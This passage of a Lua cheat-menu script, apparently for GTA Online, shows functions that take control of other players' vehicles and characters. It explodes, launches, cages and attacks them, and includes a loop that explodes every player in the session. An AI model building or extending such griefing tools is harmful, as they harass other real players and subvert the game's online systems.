        local heading = Natives.InvokeFloat(N.GET_ENTITY_HEADING, targetPed) or 0
        
        local clone = GTA.CreatePed(modelHash, 28, sx, sy, tz, heading, true, true)
        if clone and clone ~= 0 then
            table.insert(State.spawnedEntities, clone)
            
            -- Try to clone appearance (components)
            pcall(function()
                -- Clone drawable variations (clothes)
                for comp = 0, 11 do
                    local drawable = Natives.InvokeInt(N.GET_PED_DRAWABLE_VARIATION, targetPed, comp)
                    local texture = Natives.InvokeInt(N.GET_PED_TEXTURE_VARIATION, targetPed, comp)
                    Natives.InvokeVoid(N.SET_PED_COMPONENT_VARIATION, clone, comp, drawable, texture, 0)
                end
                
                -- Clone props (hats, glasses, etc)
                for prop = 0, 2 do
                    local propIndex = Natives.InvokeInt(N.GET_PED_PROP_INDEX, targetPed, prop)
                    local propTexture = Natives.InvokeInt(N.GET_PED_PROP_TEXTURE_INDEX, targetPed, prop)
                    if propIndex >= 0 then
                        Natives.InvokeVoid(N.SET_PED_PROP_INDEX, clone, prop, propIndex, propTexture, true)
                    end
                end
            end)
            
            -- Make clone aggressive toward target
            pcall(function()
                Natives.InvokeVoid(N.SET_PED_COMBAT_ATTRIBUTES, clone, 46, true)
                Natives.InvokeVoid(N.SET_PED_ACCURACY, clone, 80)
                Natives.InvokeVoid(N.GIVE_WEAPON_TO_PED, clone, WEAPON_PISTOL, 9999, false, true)
                Natives.InvokeVoid(N.TASK_COMBAT_PED, clone, targetPed, 0, 16)
                Natives.InvokeVoid(N.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS, clone, true)
            end)
            
            trackAttacker(pid, clone)
            toast(SCRIPT_NAME, "Clone spawned!")
        else
            toast(SCRIPT_NAME, "Failed to spawn clone!")
        end
    end)
end

-- OceanGate Experience (from Dolos) - teleports vehicle to ocean depth and crushes it
local function oceanGateExperience(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    local veh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, targetPed, true)
    if not veh or veh == 0 then
        toast(SCRIPT_NAME, "Player not in vehicle!")
        return
    end
    
    Script.QueueJob(function()
        -- Deep ocean coordinates
        local oceanX, oceanY, oceanZ = 4499.8447, -4395.717, -50
        
        requestControlOfEntity(veh)
        Natives.InvokeVoid(N.SET_ENTITY_COORDS, veh, oceanX, oceanY, oceanZ, false, false, false, false)
        
        Script.Yield(100)
        requestControlOfEntity(veh)
        
        -- Lock doors
        pcall(function()
            Natives.InvokeVoid(N.SET_VEHICLE_DOORS_LOCKED, veh, 4)
        end)
        
        -- Wait then explode
        Script.Yield(4000)
        Natives.InvokeVoid(N.ADD_EXPLOSION, oceanX, oceanY, oceanZ, 37, 100.0, false, true, 0.0)
        
        toast(SCRIPT_NAME, "OceanGate Experience delivered!")
    end)
end

-- Spin vehicle (continuous spin loop) - BEYBLADE STYLE: No lift, just horizontal spin
local SpinVehicleTargets = {}

local function spinVehicleTick(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    local veh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, targetPed, false)
    if veh and veh ~= 0 then
        requestControlOfEntity(veh)
        -- Apply force at offset to create horizontal torque (beyblade spin)
        -- X force at Y offset creates rotation around Z axis + minor lift
        Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, veh, 1, 
            8.0, 0, 2.0,    -- Force X + minor Z lift
            0, 2.0, 0,      -- Offset in Y to create torque
            0, false, false, true)
    end
end

-- Catapult vehicle (launch forward with spin)
local function catapultVehicle(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    local veh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, targetPed, false)
    if not veh or veh == 0 then
        toast(SCRIPT_NAME, "Player not in vehicle!")
        return
    end
    
    Script.QueueJob(function()
        requestControlOfEntity(veh)
        local h = Natives.InvokeFloat(N.GET_ENTITY_HEADING, veh)
        local r = math.rad(h)
        -- Launch forward with upward angle and spin
        Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, veh, 1, 
            -math.sin(r) * 150, math.cos(r) * 150, 100.0, 
            5.0, 0, 0, 0, false, false, true)
        toast(SCRIPT_NAME, "Vehicle catapulted!")
    end)
end

-- Flip vehicle upside down
local function flipVehicle(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    local veh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, targetPed, false)
    if not veh or veh == 0 then
        toast(SCRIPT_NAME, "Player not in vehicle!")
        return
    end
    
    Script.QueueJob(function()
        requestControlOfEntity(veh)
        local rx, ry, rz = Natives.InvokeV3(N.GET_ENTITY_ROTATION, veh, 2)
        if rx then
            Natives.InvokeVoid(N.SET_ENTITY_ROTATION, veh, 180.0, ry, rz, 2, true)
        end
        toast(SCRIPT_NAME, "Vehicle flipped!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- NUKE FUNCTIONS
-- ═══════════════════════════════════════════════════════════════════════════

local function executeNuke(x, y, z)
    Script.QueueJob(function()
        local height = WeaponSettings.nukeHeight
        
        -- Initial ground explosions in wider radius
        for radius = 0, 30, 10 do
            for angle = 0, 360, 45 do
                local rad = math.rad(angle)
                local ex = x + math.cos(rad) * radius
                local ey = y + math.sin(rad) * radius
                Natives.InvokeVoid(N.ADD_EXPLOSION, ex, ey, z, 8, 50.0, true, false, 1.5)
            end
            Script.Yield(30)
        end
        
        -- Rising column
        for a = 0, height, 4 do
            Natives.InvokeVoid(N.ADD_EXPLOSION, x, y, z + a, 8, 30.0, true, false, 1.0)
            Script.Yield(30)
        end
        
        -- Mushroom cloud top - bigger spread
        local topZ = z + height
        local spread = 25
        for angle = 0, 360, 30 do
            local rad = math.rad(angle)
            Natives.InvokeVoid(N.ADD_EXPLOSION, x + math.cos(rad) * spread, y + math.sin(rad) * spread, topZ, 82, 20.0, true, false, 1.5)
        end
        
        -- Second wave ground explosions
        Script.Yield(100)
        for radius = 10, 50, 15 do
            for angle = 0, 360, 60 do
                local rad = math.rad(angle)
                local ex = x + math.cos(rad) * radius
                local ey = y + math.sin(rad) * radius
                Natives.InvokeVoid(N.ADD_EXPLOSION, ex, ey, z, 7, 30.0, true, false, 1.0)
            end
            Script.Yield(20)
        end
        
        log("☢️ NUKE DETONATED")
    end)
end

local function getWaypointCoords()
    if not Natives.InvokeBool(N.IS_WAYPOINT_ACTIVE) then return nil end
    local blip = Natives.InvokeInt(N.GET_FIRST_BLIP_INFO_ID, 8)
    if not blip or blip == 0 then return nil end
    local x, y, z = Natives.InvokeV3(N.GET_BLIP_COORDS, blip)
    if x and y then
        if not z or z == 0 then z = 50.0 end
        return x, y, z
    end
    return nil
end

local function nukeWaypoint()
    local x, y, z = getWaypointCoords()
    if x then
        executeNuke(x, y, z)
        toast("Nuke", "☢️ Nuke launched!")
    else
        toast("Nuke", "No waypoint set!")
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- NUKE GUN
-- ═══════════════════════════════════════════════════════════════════════════

local nukeShootCooldown = 0

local function NukeGunTick()
    if not WeaponSettings.nukeGun then return end
    if nukeShootCooldown > 0 then
        nukeShootCooldown = nukeShootCooldown - 1
        return
    end
    
    local selfPed = getLocalPlayerPed()
    local currentWeapon = Natives.InvokeInt(N.GET_SELECTED_PED_WEAPON, selfPed)
    
    if currentWeapon ~= WEAPON_HOMING and currentWeapon ~= WEAPON_RPG then return end
    
    if Natives.InvokeBool(N.IS_PED_SHOOTING, selfPed) then
        local camX, camY, camZ = Natives.InvokeV3(N.GET_GAMEPLAY_CAM_COORD)
        local rotX, rotY, rotZ = Natives.InvokeV3(N.GET_FINAL_RENDERED_CAM_ROT, 2)
        
        local pitch = math.rad(rotX)
        local yaw = math.rad(rotZ)
        local dirX = -math.sin(yaw) * math.cos(pitch)
        local dirY = math.cos(yaw) * math.cos(pitch)
        local dirZ = math.sin(pitch)
        
        local missileHash = Utils.Joaat("w_arena_airmissile_01a")
        if requestModel(missileHash) then
            local missile = GTA.CreateObject(missileHash, camX + dirX * 5, camY + dirY * 5, camZ + dirZ * 5, true, true)
            if missile and missile ~= 0 then
                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, missile, 0, dirX * 300, dirY * 300, dirZ * 300, 0, 0, 0, 0, true, false, true, false, true)
                Natives.InvokeVoid(N.SET_ENTITY_ROTATION, missile, rotX, rotY, rotZ, 2, true)
                
                Script.QueueJob(function()
                    local startTime = os.clock()
                    while doesEntityExist(missile) and (os.clock() - startTime) < 10 do
                        if Natives.InvokeBool(N.HAS_ENTITY_COLLIDED_WITH_ANYTHING, missile) then
                            local mx, my, mz = Natives.InvokeV3(N.GET_ENTITY_COORDS, missile, true)
                            deleteEntity(missile)
                            executeNuke(mx, my, mz)
                            break
                        end
                        Script.Yield(0)
                    end
                    if doesEntityExist(missile) then deleteEntity(missile) end
                end)
            end
        end
        nukeShootCooldown = 30
        toast("Nuke Gun", "☢️ NUKE LAUNCHED!")
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- VEHICLE CONTROLS - FIXED: Uses NETWORK_REQUEST_CONTROL native, not ownership transfer
-- ═══════════════════════════════════════════════════════════════════════════

local function getPlayerVehicle(pid)
    local ped = getPlayerPed(pid)
    if ped and ped ~= 0 and Natives.InvokeBool(N.IS_PED_IN_ANY_VEHICLE, ped, true) then
        return Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, ped, false)
    end
    return 0
end

local function LaunchVehicle(playerId, dir, power)
    pcall(function()
        local veh = getPlayerVehicle(playerId)
        if veh and veh ~= 0 then
            requestControlOfEntity(veh)
            if dir == "up" then
                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, veh, 1, 0, 0, power or 100, 0, 0, 0.5, 0, false, false, true)
            elseif dir == "forward" then
                local h = Natives.InvokeFloat(N.GET_ENTITY_HEADING, veh)
                local r = math.rad(h)
                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, veh, 1, math.sin(r) * (power or 50), math.cos(r) * (power or 50), 10, 0, 0, 0.5, 0, false, false, true)
            elseif dir == "down" then
                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, veh, 1, 0, 0, -(power or 50), 0, 0, 0.5, 0, false, false, true)
            end
        end
    end)
end

local function ToTheMoon(playerId, enable)
    if enable then
        State.vehicleLoops[playerId] = State.vehicleLoops[playerId] or {}
        State.vehicleLoops[playerId].moon = true
    else
        if State.vehicleLoops[playerId] then 
            State.vehicleLoops[playerId].moon = nil 
        end
    end
end

local function Anchor(playerId, enable)
    if enable then
        State.vehicleLoops[playerId] = State.vehicleLoops[playerId] or {}
        State.vehicleLoops[playerId].anchor = true
    else
        if State.vehicleLoops[playerId] then 
            State.vehicleLoops[playerId].anchor = nil 
        end
    end
end

-- FIXED: Uses native control request, not ownership transfer (doesn't boot player)
-- SMOOTH: Lower force applied more frequently for less choppy movement
local function VehicleLoopsTick()
    for playerId, loops in pairs(State.vehicleLoops) do
        pcall(function()
            local veh = getPlayerVehicle(playerId)
            if veh and veh ~= 0 then
                -- Just request control via native, don't transfer ownership
                requestControlOfEntity(veh)
                
                if loops.moon then
                    -- Smoother: 50 force applied every tick (was 200 every 10ms)
                    Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, veh, 1, 0, 0, 50.0, 0, 0, 0.1, 0, false, false, true)
                end
                
                if loops.anchor and Natives.InvokeBool(N.IS_ENTITY_IN_AIR, veh) then
                    -- Smoother: -150 force applied every tick (was -600 every 10ms)
                    Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, veh, 1, 0, 0, -150.0, 0, 0, 0, 0, false, false, true)
                end
            end
        end)
    end
end

local function lockBurnout(pid, enabled)
    pcall(function()
        local veh = getPlayerVehicle(pid)
        if veh and veh ~= 0 then
            requestControlOfEntity(veh)
            Natives.InvokeVoid(N.SET_VEHICLE_BURNOUT, veh, enabled)
            if enabled then
                Natives.InvokeVoid(N.SET_VEHICLE_FORWARD_SPEED, veh, 0.0)
            end
        end
    end)
end

local function setTorque(pid, multiplier)
    pcall(function()
        local veh = getPlayerVehicle(pid)
        if veh and veh ~= 0 then
            requestControlOfEntity(veh)
            Natives.InvokeVoid(N.SET_VEHICLE_CHEAT_POWER_INCREASE, veh, multiplier)
        end
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- CAGES
-- ═══════════════════════════════════════════════════════════════════════════

local function spawnCage(pid, cageType)
    local x, y, z = getPlayerCoords(pid)
    if not x then return end
    
    Script.QueueJob(function()
        if cageType == "container" then
            -- Container drops on top of player
            local hash = Utils.Joaat("prop_container_03a")
            if requestModel(hash) then
                local obj = GTA.CreateObject(hash, x, y, z + 3.0, true, true)
                if obj and obj ~= 0 then
                    Natives.InvokeVoid(N.FREEZE_ENTITY_POSITION, obj, true)
                    table.insert(State.spawnedEntities, obj)
                end
                toast(SCRIPT_NAME, "Container cage spawned!")
            end
        elseif cageType == "fence" then
            -- FIXED: Create proper enclosing fence cage
            local hash = Utils.Joaat("prop_fnclink_03e")
            if requestModel(hash) then
                -- Use 4 fences to create a box
                local size = 2.0
                local positions = {
                    {x = x + size, y = y, rot = 0},
                    {x = x - size, y = y, rot = 0},
                    {x = x, y = y + size, rot = 90},
                    {x = x, y = y - size, rot = 90},
                }
                for _, pos in ipairs(positions) do
                    local fence = GTA.CreateObject(hash, pos.x, pos.y, z - 1, true, true)
                    if fence and fence ~= 0 then
                        Natives.InvokeVoid(N.SET_ENTITY_ROTATION, fence, 0.0, 0.0, pos.rot, 2, true)
                        Natives.InvokeVoid(N.FREEZE_ENTITY_POSITION, fence, true)
                        table.insert(State.spawnedEntities, fence)
                    end
                end
                toast(SCRIPT_NAME, "Fence cage spawned!")
            end
        elseif cageType == "stunt" then
            -- FIXED: Stunt tube vertical (standing up)
            local hash = Utils.Joaat("stt_prop_stunt_tube_s")
            if requestModel(hash) then
                local obj = GTA.CreateObject(hash, x, y, z - 1, true, true)
                if obj and obj ~= 0 then
                    -- Rotate to be vertical (player inside looking up/down)
                    Natives.InvokeVoid(N.SET_ENTITY_ROTATION, obj, 0.0, 90.0, 0.0, 2, true)
                    Natives.InvokeVoid(N.FREEZE_ENTITY_POSITION, obj, true)
                    table.insert(State.spawnedEntities, obj)
                end
                toast(SCRIPT_NAME, "Stunt tube spawned!")
            end
        end
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- ENTITY YEET - Nearby entities tornado (uses GetRendered for quick access)
-- FIXED: Added limits and safer iteration to prevent crashes
-- ═══════════════════════════════════════════════════════════════════════════

local function EntityYeet(pid)
    local targetX, targetY, targetZ = getPlayerCoords(pid)
    if not targetX then return end
    
    local rangeSq = YeetSettings.range * YeetSettings.range
    local mult = YeetSettings.multiplier
    local yeetedCount = 0
    local maxPerCall = 6  -- Limit to prevent crashes
    
    -- Tornado angle - increments each call for swirl effect
    State.tornadoAngle = (State.tornadoAngle or 0) + 0.5
    if State.tornadoAngle > 6.28 then State.tornadoAngle = 0 end
    
    -- Get my vehicle to exclude
    local myPed = getLocalPlayerPed()
    local myVeh = 0
    if myPed and Natives.InvokeBool(N.IS_PED_IN_ANY_VEHICLE, myPed, true) then
        myVeh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, myPed, false) or 0
    end
    
    -- Get target's vehicle to exclude
    local targetPed = getPlayerPed(pid)
    local targetVeh = 0
    if targetPed and Natives.InvokeBool(N.IS_PED_IN_ANY_VEHICLE, targetPed, true) then
        targetVeh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, targetPed, false) or 0
    end
    
    -- Get rendered vehicles (nearby) - safer than full pool
    local vehicles = PoolMgr.GetRenderedVehicles()
    if not vehicles then return end
    
    for _, vehObj in pairs(vehicles) do
        if yeetedCount >= maxPerCall then break end
        
        pcall(function()
            local handle = GTA.PointerToHandle(vehObj)
            if handle and handle ~= 0 and handle ~= myVeh and handle ~= targetVeh then
                local vx, vy, vz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
                if vx then
                    local dx = targetX - vx
                    local dy = targetY - vy
                    local dz = targetZ - vz
                    local distSq = dx*dx + dy*dy + dz*dz
                    
                    if distSq < rangeSq and distSq > 25 then
                        if requestControlOfEntity(handle) then
                            local dist = math.sqrt(distSq)
                            local towardX = dx / dist
                            local towardY = dy / dist
                            local swirlX = -towardY
                            local swirlY = towardX
                            
                            Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
                                (swirlX * mult * 3) + (towardX * mult), 
                                (swirlY * mult * 3) + (towardY * mult), 
                                mult * 2, true, false, true, true)
                            yeetedCount = yeetedCount + 1
                        end
                    end
                end
            end
        end)
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- ENTITY STORM - JERRY SCRIPT STYLE - ABSOLUTELY INSANE VEHICLE SWARM
-- Grabs ALL vehicles from pool and sends them FLYING at target continuously
-- This is the crazy mode - vehicles launch into the air and swarm like bees
-- ═══════════════════════════════════════════════════════════════════════════

local function EntityStorm(pid)
    local targetX, targetY, targetZ = getPlayerCoords(pid)
    if not targetX then return end
    
    local mult = YeetSettings.multiplier
    
    -- Get my vehicle to exclude
    local myPed = getLocalPlayerPed()
    local myVeh = 0
    if myPed and Natives.InvokeBool(N.IS_PED_IN_ANY_VEHICLE, myPed, true) then
        myVeh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, myPed, false) or 0
    end
    
    -- Get target's vehicle
    local targetPed = getPlayerPed(pid)
    local targetVeh = 0
    if targetPed and Natives.InvokeBool(N.IS_PED_IN_ANY_VEHICLE, targetPed, true) then
        targetVeh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, targetPed, false) or 0
    end
    
    -- PHASE 1: Rendered vehicles (nearby) - These get VIOLENT force toward target
    local vehicles = PoolMgr.GetRenderedVehicles()
    if vehicles then
        for _, vehObj in pairs(vehicles) do
            pcall(function()
                local handle = GTA.PointerToHandle(vehObj)
                if handle and handle ~= 0 and handle ~= myVeh and handle ~= targetVeh then
                    local vx, vy, vz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
                    if vx then
                        local dx = targetX - vx
                        local dy = targetY - vy
                        local dz = targetZ - vz
                        local distSq = dx*dx + dy*dy + dz*dz
                        
                        -- Affect vehicles 5m - 300m away
                        if distSq < 90000 and distSq > 25 then
                            if requestControlOfEntity(handle) then
                                local dist = math.sqrt(distSq)
                                local towardX = dx / dist
                                local towardY = dy / dist
                                local towardZ = dz / dist
                                
                                -- INSANE force - launch vehicles into air toward target
                                -- Closer = less force (so they orbit), farther = more force (so they fly in)
                                local distFactor = math.min(dist / 50, 3.0)  -- 0-3x multiplier based on distance
                                local forceX = towardX * mult * 20 * distFactor
                                local forceY = towardY * mult * 20 * distFactor
                                local forceZ = mult * 15 + math.random(5, 15)  -- Strong upward + randomness
                                
                                -- Add swirl effect (perpendicular force for circular motion)
                                local swirlX = -towardY * mult * 5
                                local swirlY = towardX * mult * 5
                                
                                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
                                    forceX + swirlX, forceY + swirlY, forceZ, 
                                    true, false, true, true)
                                
                                -- Also add some rotation for chaos
                                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, handle, 1,
                                    (math.random() - 0.5) * mult * 5,
                                    (math.random() - 0.5) * mult * 5,
                                    0,
                                    (math.random() - 0.5) * 2,
                                    (math.random() - 0.5) * 2,
                                    (math.random() - 0.5) * 2,
                                    0, false, false, true, false, true)
                            end
                        end
                    end
                end
            end)
        end
    end
    
    -- PHASE 2: Sample from FULL vehicle pool (gets faraway vehicles too)
    local totalVehicles = PoolMgr.GetCurrentVehicleCount() or 0
    if totalVehicles > 0 then
        -- Process 10 random vehicles from the pool each tick
        for attempt = 1, 10 do
            local i = math.random(0, totalVehicles - 1)
            pcall(function()
                local handle = PoolMgr.GetVehicle(i)
                if handle and handle ~= 0 and handle ~= myVeh and handle ~= targetVeh then
                    local vx, vy, vz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
                    if vx then
                        local dx = targetX - vx
                        local dy = targetY - vy
                        local dz = targetZ - vz
                        local distSq = dx*dx + dy*dy + dz*dz
                        
                        -- Far vehicles (100m - 1000m) get MASSIVE force to bring them in
                        if distSq > 10000 and distSq < 1000000 then
                            if requestControlOfEntity(handle) then
                                local dist = math.sqrt(distSq)
                                local towardX = dx / dist
                                local towardY = dy / dist
                                
                                -- MASSIVE horizontal pull + huge upward force (makes them fly in from distance)
                                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
                                    towardX * mult * 40, 
                                    towardY * mult * 40, 
                                    mult * 25,  -- Launch them HIGH
                                    true, false, true, true)
                            end
                        end
                    end
                end
            end)
        end
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- FIRE WINGS - Uses directional flames angled outward from back
-- ═══════════════════════════════════════════════════════════════════════════

-- Fire wing positions with direction angles
-- offset = position from spine, angle = direction flame shoots
local FireWingOffsets = {
    -- Left wing (flames angle outward to the left and back)
    {x = -0.2, y = -0.15, z = 0.3, dirX = -0.7, dirY = -0.5, dirZ = 0.3},
    {x = -0.4, y = -0.2, z = 0.35, dirX = -0.8, dirY = -0.4, dirZ = 0.2},
    {x = -0.6, y = -0.25, z = 0.3, dirX = -0.9, dirY = -0.3, dirZ = 0.1},
    {x = -0.8, y = -0.3, z = 0.2, dirX = -1.0, dirY = -0.2, dirZ = 0.0},
    -- Right wing (flames angle outward to the right and back)
    {x = 0.2, y = -0.15, z = 0.3, dirX = 0.7, dirY = -0.5, dirZ = 0.3},
    {x = 0.4, y = -0.2, z = 0.35, dirX = 0.8, dirY = -0.4, dirZ = 0.2},
    {x = 0.6, y = -0.25, z = 0.3, dirX = 0.9, dirY = -0.3, dirZ = 0.1},
    {x = 0.8, y = -0.3, z = 0.2, dirX = 1.0, dirY = -0.2, dirZ = 0.0},
}

local function FireWingsTick()
    if not SelfSettings.fireWingsEnabled then return end
    
    local selfPed = getLocalPlayerPed()
    if not selfPed or selfPed == 0 then return end
    
    -- Make player fire-proof
    Natives.InvokeVoid(N.SET_ENTITY_PROOFS, selfPed, false, true, false, false, false, false, 1, false)
    
    -- Get spine bone position (bone 24818 = SKEL_Spine3)
    local spineX, spineY, spineZ = Natives.InvokeV3(N.GET_PED_BONE_COORDS, selfPed, 24818, 0, 0, 0)
    if not spineX then return end
    
    -- Get player heading for rotation
    local heading = Natives.InvokeFloat(N.GET_ENTITY_HEADING, selfPed)
    local headingRad = math.rad(heading)
    local cosH = math.cos(headingRad)
    local sinH = math.sin(headingRad)
    
    -- Load PTFX asset - use scr_bike_fire for better flame trails
    if not requestPtfx("core") then return end
    
    local scale = SelfSettings.fireWingsScale / 10.0
    
    -- Spawn fire at each wing position with direction
    for _, w in ipairs(FireWingOffsets) do
        -- Rotate position offset by player heading
        local posX = w.x * cosH - w.y * sinH
        local posY = w.x * sinH + w.y * cosH
        
        -- Rotate direction by player heading
        local dirX = w.dirX * cosH - w.dirY * sinH
        local dirY = w.dirX * sinH + w.dirY * cosH
        
        local fx = spineX + posX
        local fy = spineY + posY
        local fz = spineZ + w.z
        
        -- Calculate rotation angles from direction (avoid math.atan2 which may not exist)
        local rotZ = 0
        local rotX = 0
        pcall(function()
            if math.atan2 then
                rotZ = math.deg(math.atan2(dirY, dirX)) - 90
                rotX = math.deg(math.atan2(w.dirZ, math.sqrt(dirX*dirX + dirY*dirY)))
            else
                -- Fallback calculation
                rotZ = math.deg(math.atan(dirY / (dirX + 0.0001))) - 90
                if dirX < 0 then rotZ = rotZ + 180 end
            end
        end)
        
        Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "core")
        pcall(function()
            -- Use ent_sht_flame with rotation for directional flames
            Natives.InvokeVoid(N.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD,
                "ent_sht_flame", fx, fy, fz, rotX, 0.0, rotZ, scale, false, false, false)
        end)
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- FIRE BREATH
-- ═══════════════════════════════════════════════════════════════════════════

local function FireBreathTick()
    if not SelfSettings.fireBreathEnabled then return end
    
    local selfPed = getLocalPlayerPed()
    if not selfPed or selfPed == 0 then return end
    
    local scale = SelfSettings.fireBreathScale / 10.0
    local hx, hy, hz = Natives.InvokeV3(N.GET_PED_BONE_COORDS, selfPed, 31086, 0.1, 0.0, 0.0)  -- Head bone
    
    if hx and requestPtfx("core") then
        Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "core")
        Natives.InvokeVoid(N.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD,
            "ent_sht_flame", hx, hy, hz, 0.0, 0.0, 0.0, scale, false, false, false)
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- RAGDOLL PLAYER
-- ═══════════════════════════════════════════════════════════════════════════

local function ragdollPlayer(pid)
    local ped = getPlayerPed(pid)
    if ped and ped ~= 0 then
        Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, ped, 5000, 5000, 0, false, false, false)
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- TROLLING FEATURES
-- ═══════════════════════════════════════════════════════════════════════════

local function SpawnPrimedGrenade(pid)
    local x, y, z = getPlayerCoords(pid)
    if not x then return end
    
    Natives.InvokeVoid(N.SHOOT_SINGLE_BULLET_BETWEEN_COORDS,
        x, y, z + 1.4, x, y, z + 1.3, 100, true,
        Utils.Joaat("weapon_grenade"), getLocalPlayerPed(), true, false, 100.0)
    toast(SCRIPT_NAME, "Primed grenade spawned!")
end

local function SpawnStickyOnPlayer(pid)
    local x, y, z = getPlayerCoords(pid)
    if not x then return end
    
    Natives.InvokeVoid(N.SHOOT_SINGLE_BULLET_BETWEEN_COORDS,
        x, y, z + 1.4, x, y, z + 1.3, 100, true,
        Utils.Joaat("weapon_stickybomb"), getLocalPlayerPed(), true, false, 100.0)
    toast(SCRIPT_NAME, "Sticky bomb attached! Press G to detonate.")
end

-- ═══════════════════════════════════════════════════════════════════════════
-- TICK LOOPS
-- ═══════════════════════════════════════════════════════════════════════════

-- Nuke Gun tick
Script.RegisterLooped(function()
    NukeGunTick()
    Script.Yield(0)
end)

-- Explosion loop tick
Script.RegisterLooped(function()
    for playerId, active in pairs(State.explosionLoopTargets) do
        if active then
            explodePlayer(playerId, true)
        end
    end
    Script.Yield(50)
end)

-- Vehicle loops tick (To The Moon, Anchor, Burnout) - SMOOTHER with 0ms yield
Script.RegisterLooped(function()
    VehicleLoopsTick()
    
    for playerId, active in pairs(State.burnoutTargets) do
        if active then
            lockBurnout(playerId, true)
        end
    end
    Script.Yield(0)  -- Every frame for smoothest force
end)

-- Entity Storm tick - continuous swarm attack (JerryScript style) - FAST!
Script.RegisterLooped(function()
    for playerId, active in pairs(State.entityStormTargets) do
        if active then
            pcall(function()
                EntityStorm(playerId)
            end)
        end
    end
    Script.Yield(50)  -- Every 50ms for INTENSE continuous swarm effect
end)

-- Earthquake tick
Script.RegisterLooped(function()
    for playerId, active in pairs(EarthquakeTargets) do
        if active then
            earthquakeTick(playerId)
        end
    end
    Script.Yield(80)  -- Reduced from 100
end)

-- Spin vehicle tick
Script.RegisterLooped(function()
    for playerId, active in pairs(SpinVehicleTargets) do
        if active then
            spinVehicleTick(playerId)
        end
    end
    Script.Yield(50)
end)

-- PTFX Spam tick
Script.RegisterLooped(function()
    for playerId, active in pairs(PtfxSpamTargets) do
        if active then
            ptfxSpamTick(playerId)
        end
    end
    Script.Yield(100)  -- Every 100ms for visible spam without crash
end)

-- Explode all loop
Script.RegisterLooped(function()
    if State.explodeAllLoop then
        local players = Players.Get(ePlayerListSort.PLAYER_ID, "")
        local myId = getLocalPlayerId()
        for _, pid in ipairs(players) do
            if pid ~= myId then
                explodePlayer(pid, true)
            end
        end
    end
    Script.Yield(100)
end)

-- Fire wings tick
Script.RegisterLooped(function()
    if SelfSettings.fireWingsEnabled then
        FireWingsTick()
    end
    Script.Yield(50)
end)

-- Fire breath tick
Script.RegisterLooped(function()
    FireBreathTick()
    Script.Yield(50)
end)

-- Black Hole tick
Script.RegisterLooped(function()
    for playerId, active in pairs(BlackHoleTargets) do
        if active then
            blackHoleTick(playerId)
        end
    end
    Script.Yield(50)
end)

-- Ped Launcher tick
Script.RegisterLooped(function()
    for playerId, active in pairs(PedLauncherTargets) do
        if active then
            pedLauncherTick(playerId)
        end
    end
    Script.Yield(200)  -- Less frequent to not spam too hard
end)

-- Ragdoll Loop tick
Script.RegisterLooped(function()
    for playerId, active in pairs(RagdollTargets) do
        if active then
            ragdollTick(playerId)
        end
    end
    Script.Yield(100)
end)

-- ═══════════════════════════════════════════════════════════════════════════
-- FEATURE REGISTRATION - MAIN TAB
-- ═══════════════════════════════════════════════════════════════════════════

-- Self Features
FeatureMgr.AddFeature(Utils.Joaat("JS_FireWings"), "Fire Wings", eFeatureType.Toggle,
    "Particle fire wings on your back", function(f)
        SelfSettings.fireWingsEnabled = f:IsToggled()
        if f:IsToggled() then 
            toast(SCRIPT_NAME, "Fire Wings enabled!") 
        end
    end)

FeatureMgr.AddFeature(Utils.Joaat("JS_FireWingsScale"), "Fire Wings Scale", eFeatureType.SliderInt,
    "Size of fire wings (÷10)", function(f)
        SelfSettings.fireWingsScale = f:GetIntValue()
    end)
local fwScale = FeatureMgr.GetFeature(Utils.Joaat("JS_FireWingsScale"))
if fwScale then fwScale:SetLimitValues(1, 30); fwScale:SetValue(3) end

FeatureMgr.AddFeature(Utils.Joaat("JS_FireBreath"), "Fire Breath", eFeatureType.Toggle,
    "Breathe fire like a dragon", function(f)
